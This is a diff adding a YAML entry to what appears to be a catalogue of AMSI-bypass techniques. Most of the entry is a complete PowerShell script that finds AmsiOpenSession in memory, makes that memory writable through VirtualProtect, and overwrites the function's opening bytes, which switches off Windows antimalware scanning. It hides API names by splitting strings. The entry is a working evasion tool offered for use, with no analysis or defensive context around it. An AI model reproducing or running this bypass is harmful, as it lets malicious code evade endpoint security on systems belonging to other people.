@@ -1,0 +1,13 @@
+name: ecfirstAMSI
+authors:
+  - name: Ben Miller
+    handle: '@secur3'
+    link: 
+description: |
+  AMSI bypass via overwrite
+comments:
+  - adopted from the interwebs
+language: powershell
+min_language_version: '3'
+script: |
+  function G { Param($M, $P) $sa = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' }; $unms = $sa.GetType('Microsoft.Win32.UnsafeNativeMethods'); $gmh = $unms.GetMethod('GetModuleHandle'); $gp = "GetPr"; $a = "ocAddress"; if ($P -eq "LEFT") {$P = $gp+$a}; $GetPA = $unms.GetMethod($gp+$a, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])); $k32H = $gmh.Invoke($null, @($M)); $tmpPtr = [IntPtr]::Zero; $HR = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $k32H); return $GetPA.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HR, $P)) }; function D { Param($P = (New-Object Type ), $RT = [Void]) $dOm = [AppDomain]::CurrentDomain; $Dyna = New-Object System.Reflection.AssemblyName('ReflectedDelegate'); $AB = $dOm.DefineDynamicAssembly($Dyna, [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $MB = $AB.DefineDynamicModule('InMemoryModule', $false); $TB = $MB.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]); $CB = $TB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $P); $CB.SetImplementationFlags('Runtime, Managed'); $MethB = $TB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $RT, $P); $MethB.SetImplementationFlags('Runtime, Managed'); return $TB.CreateType() }; function doit ($buf, $fa) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $fa, 3) }; [IntPtr]$fa = G amsi.dll AmsiOpenSession; $opb = 0; $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((G kernel32.dll VirtualProtect), (D @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))); $vp.Invoke($fa, 3, 0x40, [ref]$opb); $buf = [Byte[]] (0x48,0x31,0xc9); doit $buf $fa; 
